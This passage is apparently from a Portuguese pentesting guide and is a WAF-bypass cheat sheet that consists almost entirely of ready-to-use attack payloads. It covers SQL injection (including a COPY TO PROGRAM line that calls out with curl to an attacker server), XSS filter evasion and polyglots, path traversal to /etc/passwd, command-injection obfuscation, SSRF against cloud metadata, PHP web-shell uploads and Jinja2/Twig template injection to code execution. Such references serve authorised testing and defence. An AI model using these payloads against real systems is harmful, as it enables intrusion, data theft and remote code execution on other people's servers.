-- Bypass com COPY TO
'; COPY (SELECT version()) TO PROGRAM $$curl http://SEU-SERVIDOR/$$;--
```

### WAF Bypass — MSSQL Específico

```sql
-- Exec via sp_executesql com hex
EXEC sp_executesql N'SELECT * FROM users'

-- Bypass com concatenação
EXEC('SEL'+'ECT * FR'+'OM us'+'ers')

-- Comentários entre T-SQL keywords
EX/**/EC('SELECT * FROM users')

-- Usar [bracket notation]
[SELECT] * F[RO]M us[er]s
```

---

## 🔍 WAF Bypass — XSS (Cross-Site Scripting)

### Bypass de tags bloqueadas (<script>)

```html
<!-- Tags alternativas com event handlers -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<video><source onerror=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<meter onmouseover=alert(1)>
<object data="javascript:alert(1)">
<iframe src="javascript:alert(1)">
<embed src="javascript:alert(1)">
<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)></style></mtext></svg></mglyph></table></mtext></math>

<!-- Tags com barras/whitespace incomuns -->
<svg/onload=alert(1)>
<svg%0Aonload=alert(1)>
<svg%09onload=alert(1)>
<svg%0Conload=alert(1)>
<svg%0Donload=alert(1)>
<svg/onload%09=%09alert(1)>
```

### Bypass de alert() bloqueado

```html
<!-- Alternativas ao alert() -->
<img src=x onerror=prompt(1)>
<img src=x onerror=confirm(1)>
<img src=x onerror=print()>

<!-- Sem parênteses (Template Literals) -->
<img src=x onerror=alert`1`>
<svg onload=alert`1`>

<!-- Via eval + base64 -->
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>

<!-- Via constructor -->
<img src=x onerror=[].constructor.constructor('alert(1)')()>

<!-- Via Function() -->
<img src=x onerror=Function('alert(1)')()>

<!-- Via setTimeout/setInterval -->
<img src=x onerror=setTimeout('alert(1)')>
<img src=x onerror=setInterval('alert(1)')>

<!-- Concatenação para evitar regex -->
<img src=x onerror=window['al'+'ert'](1)>
<img src=x onerror=self['al'+'ert'](1)>
<img src=x onerror=top['al'+'ert'](1)>
<img src=x onerror=this['al'+'ert'](1)>

<!-- Via location e javascript: protocol -->
<img src=x onerror=location='javascript:alert(1)'>
<img src=x onerror=location='jav'+'ascript:ale'+'rt(1)'>
```

### Bypass com encoding

```html
<!-- HTML entities -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>

<!-- HTML entities sem ponto-e-vírgula -->
<img src=x onerror=&#97&#108&#101&#114&#116(1)>

<!-- Unicode escape -->
<img src=x onerror=\u0061\u006C\u0065\u0072\u0074(1)>

<!-- Double URL encoding -->
%253Cscript%253Ealert(1)%253C/script%253E
%253Csvg%2520onload%253Dalert(1)%253E

<!-- Usando JavaScript: com encoding -->
<a href="j&#x61;v&#x61;script:alert(1)">click</a>
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>

<!-- Tab/Newline dentro do protocolo JavaScript -->
<a href="java&#x09;script:alert(1)">click</a>
<a href="java&#x0A;script:alert(1)">click</a>
<a href="java&#x0D;script:alert(1)">click</a>
```

### Bypass de filtro de onerror/onload

```html
<!-- Event handlers menos conhecidos (WAFs frequentemente não filtram todos) -->
<svg onafterprint=alert(1)>
<body onbeforeprint=alert(1)>
<body onhashchange=alert(1)>
<body onpageshow=alert(1)>
<body onfocusin=alert(1)>
<body onanimationend=alert(1)>
<body ontransitionend=alert(1)>
<div onpointerover=alert(1)>hover</div>
<div ontouchstart=alert(1)>touch</div>
<div onwheel=alert(1)>scroll</div>
<form><button formaction="javascript:alert(1)">click</button></form>
<xss onpointerrawupdate=alert(1) style=position:fixed;left:0;top:0;width:100%;height:100%>hover</xss>

<!-- Via CSS + animation para disparar JS -->
<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart=alert(1)>
```

### XSS Payloads Polyglot (funcionam em múltiplos contextos)

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>'">
```

---

## 📁 WAF Bypass — LFI / Path Traversal

### Bypass de ../ bloqueado

```
# Double encoding
..%252f..%252f..%252fetc%252fpasswd

# UTF-8 overlong encoding
..%c0%af..%c0%af..%c0%afetc/passwd
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd

# Usando %2e em vez de ponto
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e/%2e%2e/%2e%2e/etc/passwd

# Double dot encodado
..%255c..%255c..%255cetc/passwd  (para Windows: backslash)

# Bypass de filtro que remove ../ uma vez
....//....//....//etc/passwd
..././..././..././etc/passwd
....\/....\/....\/etc/passwd

# Null byte (PHP < 5.3.4)
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd%00.html

# Bypass com path absoluto (se ../ é bloqueado mas path absoluto não)
/etc/passwd
file:///etc/passwd
```

### Bypass de extensão forçada (.php, .html, etc.)

```
# Null byte truncation (PHP < 5.3.4)
../../../etc/passwd%00.php

# Path truncation (caminho longo)
../../../etc/passwd/./././././././././././././././.[repitir até ~4096 chars].php

# PHP Wrappers (evitam verificação de extensão)
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/read=string.rot13/resource=/etc/passwd
php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd

# Data wrapper (payload inline)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
# Decodifica para: <?php system($_GET['cmd']);?>

# Expect wrapper (se habilitado)
expect://id
expect://cat+/etc/passwd
```

### Bypass de bloqueio de /etc/passwd e palavras-chave

```
# Usar globbing / wildcards
/e?c/p?ss?d
/e*c/pa*wd
/???/??ss??

# Encoding parcial
/etc/pas%73wd
/etc%2fpasswd

# Simlinks e /proc
/proc/self/root/etc/passwd
/proc/1/root/etc/passwd

# Leitura via /dev/fd (se LFI processa como file descriptor)
/dev/fd/../../etc/passwd
```

---

## 🖥️ WAF Bypass — Command Injection

### Bypass de espaço bloqueado

```bash
# $IFS (Internal Field Separator — padrão é espaço)
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd

# TAB (%09)
;cat%09/etc/passwd

# Brace expansion
{cat,/etc/passwd}
{ls,-la,/tmp}

# Usando newline (%0a) como separador
;%0acat%0a/etc/passwd

# Redirecionamento de input
cat</etc/passwd
```

### Bypass de palavras bloqueadas (cat, ls, id, whoami, etc.)

```bash
# Concatenação de strings
c'a't /etc/passwd
c"a"t /etc/passwd
c\a\t /etc/passwd
ca$()t /etc/passwd

# Variáveis de ambiente
/bi?/ca? /etc/passwd
/bi*/c*t /etc/pas*wd

# Wildcards e globbing
/???/??t /???/????wd
# /bin/cat /etc/passwd

# Usando echo + pipe
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
# "cat /etc/passwd" em base64

# Usando $() ou backticks
$(echo cat) /etc/passwd
`echo cat` /etc/passwd

# Usando printf
$(printf '\x63\x61\x74') /etc/passwd
# \x63\x61\x74 = 'cat'

# Usando variáveis
a=c;b=a;c=t;$a$b$c /etc/passwd

# Rev (reverso)
echo "dwssap/cte/ tac" | rev | bash

# Hexadecimal via printf
$(printf "\x69\x64")
# \x69\x64 = 'id'

# Usar alternativas ao comando
# Em vez de cat:
tac /etc/passwd         # Mostra ao contrário
nl /etc/passwd          # Com número de linhas
head /etc/passwd
tail /etc/passwd
less /etc/passwd
more /etc/passwd
sort /etc/passwd
uniq /etc/passwd
strings /etc/passwd
xxd /etc/passwd
od -c /etc/passwd
cut -c1- /etc/passwd
paste /etc/passwd
diff /etc/passwd /dev/null
sed '' /etc/passwd
awk '{print}' /etc/passwd
```

### Bypass de separadores de comando (; | && ||)

```bash
# Newline (%0a) — frequentemente não filtrado
payload%0aid

# Carriage Return + Line Feed (%0d%0a)
payload%0d%0aid

# Backticks (execução inline)
`id`

# $() (substituição de processo)
$(id)

# Pipe alternativo via process substitution
<(id)

# Bypass via && com encoding
payload%26%26id
```

### Bypass de / (barra) bloqueada

```bash
# Usar variável de ambiente
cat ${HOME:0:1}etc${HOME:0:1}passwd
# ${HOME:0:1} = '/' (primeiro char de /home/user)

# Usando variável $PWD (se estiver em /)
cat ${PWD}etc${PWD}passwd

# Usando printf
cat $(printf '\x2f')etc$(printf '\x2f')passwd

# Hex via echo
cat $(echo -e '\x2f')etc$(echo -e '\x2f')passwd
```

---

## 🌐 WAF Bypass — SSRF

### Bypass de blacklist de IP/domínio

```
# Representações alternativas de 127.0.0.1
http://2130706433              # Decimal
http://0x7f000001              # Hexadecimal
http://017700000001            # Octal
http://0x7f.0x0.0x0.0x1        # Hex por octeto
http://0177.0.0.01             # Octal por octeto
http://127.1                   # Shorthand
http://127.0.1                 # Shorthand variant
http://0                       # 0.0.0.0
http://0.0.0.0                 # Explícito
http://[::1]                   # IPv6 localhost
http://[0000::1]               # IPv6 expandido
http://[::ffff:127.0.0.1]     # IPv4-mapped IPv6
http://127.0.0.1.nip.io        # DNS rebinding
http://localhost.localdomain
http://localtest.me            # Resolve para 127.0.0.1
http://spoofed.burpcollaborator.net  # Domínio próprio apontando para 127.0.0.1

# URL with credentials (parsers podem ignorar para análise)
http://evil@127.0.0.1
http://anything:anything@127.0.0.1

# Bypass com redirect (hospedar em seu servidor)
# No seu servidor Apache/Nginx/Python:
# Redirecionar 302 para http://127.0.0.1 ou http://169.254.169.254

# Bypass com DNS rebinding
# Configurar domínio que alterna entre IP externo e 127.0.0.1 a cada consulta

# Bypass caso o filtro seja apenas no protocolo HTTP
gopher://127.0.0.1:6379/_...
dict://127.0.0.1:6379/INFO
file:///etc/passwd
tftp://127.0.0.1/test
ldap://127.0.0.1
```

### Bypass de filtro de 169.254.169.254 (Cloud Metadata)

```
# AWS Metadata v1 - Representações alternativas
http://169.254.169.254.nip.io/latest/meta-data/
http://[::ffff:a9fe:a9fe]/latest/meta-data/
http://0xa9fea9fe/latest/meta-data/
http://2852039166/latest/meta-data/
http://0251.0376.0251.0376/latest/meta-data/

# Via DNS rebinding (apontar seu domínio para 169.254.169.254)

# Bypass com redirect no seu servidor
# GET http://seu-servidor.com/ssrf → 302 Location: http://169.254.169.254/latest/meta-data/
```

---

## 📤 WAF Bypass — File Upload

```
# Extensões alternativas (se .php é bloqueado)
.phtml, .pht, .php3, .php4, .php5, .php7, .phps, .phar
.shtml (Server-Side Includes)
.inc (PHP include files, podem ser executados)
.module, .install (Drupal)

# Double extension com inversão
shell.jpg.php        # Alguns servidores executam como PHP
shell.php.jpg        # Alguns servidores olham só a primeira extensão
shell.php%00.jpg     # Null byte truncation (legado)
shell.php%0a.jpg     # Newline truncation

# Adição de caracteres no nome
shell.php.            # Trailing dot
shell.php...          # Multiple trailing dots
shell.php%20          # Trailing space
shell.php%0a          # Trailing newline
shell.php::$DATA      # Alternate data stream (Windows/IIS)

# Content-Type spoofing (enviar PHP com tipo de imagem)
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif

# Magic bytes + payload (bypass de verificação de conteúdo)
GIF89a;<?php system($_GET['cmd']); ?>
# Os primeiros bytes (GIF89a) fazem parecer um GIF legítimo

# JPEG header + payload
# Iniciar com bytes FF D8 FF E0 seguidos do payload PHP

# Bypass via .htaccess upload (Apache)
# Fazer upload de .htaccess que trata .aaa como PHP:
AddType application/x-httpd-php .aaa
# Depois fazer upload de shell.aaa com o payload PHP

# Bypass via web.config upload (IIS)
# Upload de web.config que executa ASP

# Bypass com polyglot (imagem válida + payload PHP)
# Usar ferramentas como exiftool para inserir PHP nos metadados de uma imagem real
exiftool -Comment='<?php system($_GET["cmd"]); ?>' imagem_real.jpg
mv imagem_real.jpg shell.php.jpg
```

---

## 🧩 WAF Bypass — SSTI (Server-Side Template Injection)

### Jinja2 Bypass

```python
# Se {{ }} é bloqueado, usar {% %}
{% print(7*7) %}
{% if ''.__class__ %}1{% endif %}

# Se _ (underscore) é bloqueado
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}
# \x5f = underscore

# Hex encoding de atributos
{{''['\x5f\x5fclass\x5f\x5f']['\x5f\x5fmro\x5f\x5f'][1]['\x5f\x5fsubclasses\x5f\x5f']()}}

# Via request object
{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']()}}

# Se 'class' é bloqueado
{{''|attr('\x5f\x5fcl'+'ass\x5f\x5f')}}

# Usando filtros Jinja2
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
{{namespace.__init__.__globals__.os.popen('id').read()}}

# Se . (ponto) é bloqueado, usar attr() ou []
{{''|attr('__class__')|attr('__mro__')}}
{{''['__class__']['__mro__']}}
```

### Twig Bypass (PHP)

```php
# Alternativa se {{}} é bloqueado
#{7*7}

# Bypass com filtros
{{'cat /etc/passwd'|filter('system')}}

# Usando _self.env
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}

# Array map + system
{{['id']|map('system')|join}}
{{['cat /etc/passwd']|map('passthru')}}
```

---


## 🧰 Ferramentas para WAF Bypass

### Detecção e Identificação

```bash
# wafw00f — Fingerprint de WAF
wafw00f http://ALVO.COM
wafw00f http://ALVO.COM -a  # Testar todos os WAFs possíveis

# Nmap WAF scripts
nmap -p 80,443 --script http-waf-detect,http-waf-fingerprint ALVO.COM
```

### Bypass automatizado

```bash
# SQLMap com tampers (já coberto acima)
sqlmap -u URL --tamper=... --random-agent

# Bypass-Url-Parser — Testa múltiplas representações de URL
# https://github.com/laluka/bypass-url-parser
python3 bypass-url-parser.py -u http://ALVO.COM/admin

# WhatWaf — Detecta e tenta bypass automático
# https://github.com/Ekultek/WhatWaf
whatwaf -u "http://ALVO.COM/?id=1"
```

### Fuzzing de Bypass

```bash
# Usar ffuf/wfuzz com wordlists de WAF bypass
# Wordlists recomendadas (SecLists):
# /usr/share/seclists/Fuzzing/SQLi/
# /usr/share/seclists/Fuzzing/XSS/
# /usr/share/seclists/Fuzzing/LFI/

# Exemplo: fuzzar payloads de SQLi contra WAF
ffuf -u "http://ALVO.COM/page?id=FUZZ" \
  -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt \
  -fc 403 -mc 200

# Wfuzz filtrando respostas bloqueadas
wfuzz -c -z file,/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt \
  --hc 403 "http://ALVO.COM/page?id=FUZZ"
```

### Burp Suite Extensions

```
# Turbo Intruder — Fuzzing ultra-rápido para encontrar bypass
# Bypass WAF — Extension que aplica encoding automaticamente
# Hackvertor — Encoder/decoder com tags para transformar payloads on-the-fly
# Param Miner — Descobre parâmetros e headers escondidos (útil para HPP)
```

---

## 📋 Metodologia de WAF Bypass — Checklist

```
1. [ ] Identificar se existe WAF (wafw00f, headers, comportamento)
2. [ ] Identificar qual WAF (Cloudflare, ModSecurity, AWS WAF, etc.)
3. [ ] Testar payload básico e observar resposta de bloqueio
4. [ ] Tentar encoding simples (URL encode, double encode)
5. [ ] Tentar manipulação de espaços (/**/, %09, %0a)
6. [ ] Tentar case variation (SeLeCt, UnIoN)
7. [ ] Tentar fragmentação de keywords (UN/**/ION, SE/**/LECT)
8. [ ] Tentar método HTTP alternativo (GET→POST, POST→PUT)
9. [ ] Tentar Content-Type alternativo (json, multipart)
10. [ ] Tentar HTTP Parameter Pollution
11. [ ] Tentar headers de bypass (X-Forwarded-For: 127.0.0.1)
12. [ ] Tentar chunked transfer encoding
13. [ ] Tentar payloads específicos do banco/tecnologia
14. [ ] Usar SQLMap com tampers + random-agent + delay
15. [ ] Se tudo falhar: request smuggling, DNS rebinding
```

> **Regra de ouro:** Comece pelo bypass mais simples (encoding) e vá escalando a complexidade. Cada WAF tem fraquezas diferentes — o que funciona no ModSecurity pode não funcionar no Cloudflare e vice-versa. Teste, observe, adapte.

---
